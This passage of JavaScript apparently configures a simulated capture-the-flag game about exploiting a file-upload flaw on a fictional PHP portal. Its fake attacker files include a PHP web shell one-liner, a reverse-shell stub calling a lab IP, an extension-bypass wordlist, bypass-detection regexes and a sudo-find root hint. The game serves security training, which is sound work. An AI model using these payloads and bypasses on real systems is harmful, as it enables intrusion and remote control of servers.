            <div style="color:#888; font-size:0.7rem; border:1px solid #2a2a1a; border-radius:4px; padding:10px; background:#0d0d05;">
                <span style="color:#e67e22;">Hint:</span> The root flag is at /root/root.txt. www-data has sudo access to /usr/bin/find with no password.
            </div>
        </div>`;
    },

    // ═══════════════════════════════════════════════════════
    // PHPINFO OUTPUT SIMULATION
    // ═══════════════════════════════════════════════════════

    _phpInfoOutput() {
        return `<span style="color:#3498db;">PHP Version 8.1.12</span>

System: Linux ashen-archive 5.15.0-92-generic
Build Date: Jan 10 2024 09:33:48
Server API: Apache 2.0 Handler
Document Root: /var/www/html

<span style="color:#e74c3c;">disable_functions =</span> exec,proc_open,popen,system (NOTE: system() appears misconfigured)
<span style="color:#e74c3c;">safe_mode =</span> Off
<span style="color:#e74c3c;">allow_url_fopen =</span> On
<span style="color:#e74c3c;">file_uploads =</span> On
<span style="color:#e74c3c;">upload_max_filesize =</span> 10M

Loaded Extensions: Core, date, dom, filter, json, mbstring, mysqli, openssl, pcre, pdo, session, standard, xml`;
    },

    // ═══════════════════════════════════════════════════════
    // EXTENSION HELPERS
    // ═══════════════════════════════════════════════════════

    // Returns the file extension (last dot-segment)
    _getExtension(filename) {
        const parts = filename.split('.');
        if (parts.length < 2) return '';
        return '.' + parts[parts.length - 1];
    },

    // Detect PHP-executable extensions (bypass patterns)
    _isExecutableExt(ext, filename) {
        const lower = ext.toLowerCase();
        const lowerFull = filename.toLowerCase();

        // Direct PHP variant extensions
        if (['.phtml', '.php5', '.php7', '.php8', '.phar'].includes(lower)) return true;

        // Case variation bypass: .pHp, .PHP, .Php, etc.
        if (/^\.php$/i.test(ext) && ext !== '.php') return true;

        // Double extension bypass: shell.php.txt — PHP executes based on AddHandler
        if (/\.php[0-9]?\.(txt|doc|pdf|jpg|png|gif)$/i.test(filename)) return true;

        // Null byte bypass simulation: shell.php;.txt, shell.php%00.txt
        if (/\.php[;%]/.test(filename)) return true;

        return false;
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker Kali machine)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING ===\nTarget: 10.10.14.24 (The Ashen Archive)\nObjective: File Upload Vulnerability exploitation\n\nRecon steps:\n1. nmap scan to identify services\n2. Browse the artifact submission portal\n3. Enumerate accessible directories (dirb/gobuster)\n4. Bypass the file upload filter to upload a PHP web shell\n5. Access the uploaded shell via /archive/uploads/\n6. Execute commands as www-data\n7. Escalate to root via sudo permissions\n\nGood luck, operator.'
                                },
                                'shells': {
                                    type: 'dir',
                                    children: {
                                        'simple.php': {
                                            type: 'file',
                                            content: '<?php system($_GET[\'cmd\']); ?>'
                                        },
                                        'reverse.php': {
                                            type: 'file',
                                            content: "<?php\n// Reverse shell — modify IP and PORT\n$ip   = '10.10.14.99';\n$port = 4444;\n$sock = fsockopen($ip, $port);\n$proc = proc_open('/bin/sh -i', [['pipe','r'],['pipe','w'],['pipe','w']], $pipes);\n?>"
                                        },
                                        'info.php': {
                                            type: 'file',
                                            content: '<?php phpinfo(); ?>'
                                        }
                                    }
                                },
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'extensions.txt': {
                                            type: 'file',
                                            content: '# PHP Extension Bypass List\n.php\n.php5\n.php7\n.phtml\n.phar\n.php.txt\n.php;.txt\n.php%00.txt\n.pHp\n.PHP\n.shtml\n.shtm'
                                        }
                                    }
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap 10.10.14.24\ncurl http://10.10.14.24/archive/\ndirb http://10.10.14.24\nnikto -h 10.10.14.24\nfirefox http://10.10.14.24/archive/'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'dirb': {
                                            type: 'dir',
                                            children: {
                                                'common.txt': {
                                                    type: 'file',
                                                    content: 'admin\narchive\nuploads\nshells\ncgi-bin\nconfig\nbackup\nimages\ntest\nphpinfo.php\n.htaccess'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'kali' },
                        'passwd':   { type: 'file', content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash' }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'nmap': function(args, term, engine) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target || target === '10.10.14.24') {
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.14.24
Host is up (0.028s latency).
Not shown: 998 closed tcp ports

PORT    STATE    SERVICE  VERSION
22/tcp  filtered ssh
80/tcp  open     http     Apache httpd 2.4.57 ((Debian))

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 11.23 seconds`;
            }
            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'curl': function(args, term, engine) {
            const flags     = args.filter(a => a.startsWith('-'));
            const nonFlags  = args.filter(a => !a.startsWith('-'));
            const url       = nonFlags[0] || '';
            const isPost    = flags.includes('-X') && args.includes('POST') || flags.some(f => f === '--data' || f === '-d') || flags.includes('-F');
            const dataIdx   = args.findIndex(a => a === '--data' || a === '-d' || a === '-F');
            const postData  = dataIdx !== -1 ? (args[dataIdx + 1] || '') : '';

            if (!url) return 'curl: try \'curl --help\' for more information';

            // Fetch uploaded file via URL (triggers PHP execution)
            const uploadMatch = url.match(/10\.10\.14\.24\/archive\/uploads\/([^?]+)(\?.+)?$/);
            if (uploadMatch) {
                const fname  = uploadMatch[1];
                const qs     = uploadMatch[2] ? uploadMatch[2].slice(1) : '';
                const output = A8Config._renderUploadedFile(fname, qs);
                // Strip HTML for terminal display
                return A8Config._stripHtml(output);
            }

            // Fetch main archive page
            if (url.includes('10.10.14.24') && url.includes('/archive/') && !url.includes('/uploads/') && !url.includes('/admin/')) {
                return `<!DOCTYPE html>
<html>
<head><title>Ashen Archive</title></head>
<body>
<h1>Ashen Archive</h1>
<p>Artifact Submission Portal v1.4.2</p>
<form action="/archive/upload.php" method="POST" enctype="multipart/form-data">
  <input name="filename" placeholder="Filename (e.g. document.txt)">
  <textarea name="content" placeholder="Artifact content"></textarea>
  <button type="submit">Upload Artifact</button>
</form>
<p><a href="/archive/uploads/">View uploads directory</a></p>
</body>
</html>`;
            }

            // Upload via POST simulation (curl -F "filename=shell.phtml" ...)
            if (isPost && url.includes('10.10.14.24') && url.includes('/archive/')) {
                let fname = '', fContent = '';
                if (postData) {
                    const fnMatch = postData.match(/filename=([^&;]+)/i);
                    const ctMatch = postData.match(/content=([^&;]+)/i);
                    fname    = fnMatch ? decodeURIComponent(fnMatch[1]) : 'upload.txt';
                    fContent = ctMatch ? decodeURIComponent(ctMatch[1]) : '(no content)';
                }
                // Run through upload engine
                const result = A8Config._handleUpload({ filename: fname, content: fContent }, engine);
                return A8Config._stripHtml(result);
            }

            return `curl: (7) Failed to connect to ${(url.replace(/https?:\/\//, '').split('/')[0] || 'host')}: Connection refused`;
        },

        'dirb': function(args) {
            const target = args[0] || '';
            if (!target) return 'Usage: dirb <url_base> [<wordlist_file>]';
            return `---- Scanning URL: ${target} ----
+ ${target.replace(/\/$/, '')}/index.html     (CODE:200|SIZE:3842)
+ /archive/upload.php    (CODE:200|SIZE:2104)
+ /archive/uploads/      (CODE:200|SIZE:1540)
+ /archive/admin/        (CODE:403|SIZE:276)
+ /archive/config/       (CODE:403|SIZE:276)

---- Results ----
4 results found.
IMPORTANT: Found /archive/uploads/ — directory listing ENABLED`;
        },

        'gobuster': function(args) {
            const url = args.find(a => a.startsWith('http')) || 'http://10.10.14.24/archive/';
            return `Gobuster v3.6
[+] Url:          ${url}
[+] Wordlist:     /usr/share/wordlists/dirb/common.txt
[+] Status codes: 200,204,301,302,307,401,403
===============================================================
/archive/              (Status: 200) [Size: 3842]
/archive/upload.php    (Status: 200) [Size: 2104]
/archive/uploads/      (Status: 200) [Size: 1540]  <-- directory listing enabled
/archive/admin/        (Status: 403) [Size: 276]
/archive/config/       (Status: 403) [Size: 276]
===============================================================
Finished`;
        },

        'nikto': function(args) {
            return `- Nikto v2.5.0
+ Target IP:       10.10.14.24
+ Target Hostname:  ashen-archive.ctf.local
+ Target Port:      80
+ Server: Apache/2.4.57 (Debian)
+ /archive/uploads/: Directory indexing found — contents publicly accessible
+ /archive/upload.php: File upload functionality detected
+ Server may allow execution of PHP scripts in upload directory (Apache AddHandler misconfiguration)
+ Apache/2.4.57 appears to be outdated (current is at least Apache/2.4.62)
+ OSVDB-3092: /archive/config/: Configuration directory found
+ PHP/8.1.12 appears to be outdated (current is at least PHP/8.3.x)
+ 8 items checked: 4 findings`;
        },

        'wfuzz': function(args) {
            return `Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing HTTPS sites.

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.14.24/archive/upload.php
Total requests: 12

===================================================================
ID  Response  Lines  Word    Chars  Request
===================================================================
000001:  C=403      7 L     11 W     276 Ch  ".php"
000002:  C=200     12 L     22 W     512 Ch  ".php5"   <-- BYPASS
000003:  C=200     12 L     22 W     512 Ch  ".phtml"  <-- BYPASS
000004:  C=200     12 L     22 W     512 Ch  ".pHp"    <-- BYPASS
000005:  C=403      7 L     11 W     276 Ch  ".asp"
000006:  C=403      7 L     11 W     276 Ch  ".jsp"
000007:  C=200     12 L     22 W     512 Ch  ".php.txt" <-- BYPASS (double ext)
000008:  C=200     12 L     22 W     512 Ch  ".php;.txt" <-- BYPASS (null byte sim)
000009:  C=200     12 L     22 W     512 Ch  ".php%00.txt" <-- BYPASS (null byte)
===================================================================

Finished in 2.145 seconds`;
        },

        'ping': function(args) {
            const target = args.find(a => !a.startsWith('-')) || '';
            if (!target) return 'Usage: ping [-c count] destination';
            if (target === '10.10.14.24') {
                return `PING 10.10.14.24 (10.10.14.24) 56(84) bytes of data.
64 bytes from 10.10.14.24: icmp_seq=1 ttl=64 time=28.4 ms
64 bytes from 10.10.14.24: icmp_seq=2 ttl=64 time=27.9 ms
64 bytes from 10.10.14.24: icmp_seq=3 ttl=64 time=28.7 ms

--- 10.10.14.24 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss
rtt min/avg/max/mdev = 27.9/28.3/28.7/0.330 ms`;
            }
            return `ping: ${target}: Name or service not known`;
        }
    },

    // ═══════════════════════════════════════════════════════
    // HTML HELPERS
    // ═══════════════════════════════════════════════════════

    _tableHtml(headers, rows) {
        let html = '<table style="width:100%; border-collapse:collapse; font-size:0.8rem;"><thead><tr>';
        headers.forEach(h => {
            html += `<th style="padding:6px 10px; text-align:left; color:#e74c3c; border-bottom:2px solid #4a1a1a; background:#1a0808;">${h}</th>`;
        });
        html += '</tr></thead><tbody>';
        rows.forEach(row => {
            html += '<tr>';
            row.forEach(cell => {
                html += `<td style="padding:5px 10px; border-bottom:1px solid #2a1a1a;">${cell}</td>`;
            });
            html += '</tr>';
        });
        html += '</tbody></table>';
        return html;
    },

    _msgHtml(type, text) {
        const styles = {
            error:   'color:#e74c3c; background:rgba(231,76,60,0.08); border:1px solid rgba(231,76,60,0.3);',
            success: 'color:#2ecc71; background:rgba(46,204,113,0.08); border:1px solid rgba(46,204,113,0.3);',
            info:    'color:#3498db; background:rgba(52,152,219,0.08); border:1px solid rgba(52,152,219,0.2);'
        };
        return `<div style="${styles[type] || styles.info} border-radius:4px; padding:10px; font-size:0.82rem; white-space:pre-wrap;">${text}</div>`;
    },

    _escHtml(str) {
        const div = document.createElement('div');
        div.textContent = String(str);
        return div.innerHTML;
    },

    _stripHtml(html) {
        const tmp = document.createElement('div');
        tmp.innerHTML = html;
        // Convert tables to readable text
        const tables = tmp.querySelectorAll('table');
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let text = '';
            rows.forEach(row => {
                const cells = row.querySelectorAll('td, th');
                const cellTexts = Array.from(cells).map(c => c.textContent.trim().padEnd(20));
                text += cellTexts.join('  ') + '\n';
            });
            table.replaceWith(document.createTextNode(text));
        });
        return tmp.textContent.trim();
    }

};
